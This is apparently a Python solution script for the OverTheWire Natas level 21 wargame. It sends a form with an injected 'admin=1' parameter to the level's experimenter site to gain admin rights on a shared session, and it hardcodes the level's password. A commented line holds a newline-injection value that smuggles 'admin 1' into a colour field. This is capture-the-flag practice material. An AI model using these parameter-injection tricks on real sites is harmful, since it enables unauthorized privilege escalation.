import requests
import time

url = "http://natas21-experimenter.natas.labs.overthewire.org/index.php/?debug"
username = "natas21"
password = "BPhv63cKE1lkQl04cE5CuFTzXe15NfiH"  #Password for Natas21

align = "left"
fontsize = "100%"
# bgcolor = "red%0Aadmin%201" # Trying to set bgcolor = red\nadmin 1
bgcolor = "red"
cookie = {'PHPSESSID': "hk5fbls2asgdnbkrndehe8bthk"}

data = {"align": align, "fontsize": fontsize, "bgcolor": bgcolor, "submit": "1", "admin": "1"}


# Creating a session
session = requests.Session()

# Send the request
response = session.post(url, auth=(username, password), data=data)
print("\n\t1ST CALL:")
print("" + response.text)
print("-" * 50)
cookie = {"PHPSESSID": response.cookies.get("PHPSESSID")}

print(cookie)

# time.sleep(1)

# #Sending the request again
# response = session.post(url, auth=(username, password), data=data, cookies=cookie)

# print("\n\t2ND CALL:")
# print("" + response.text)
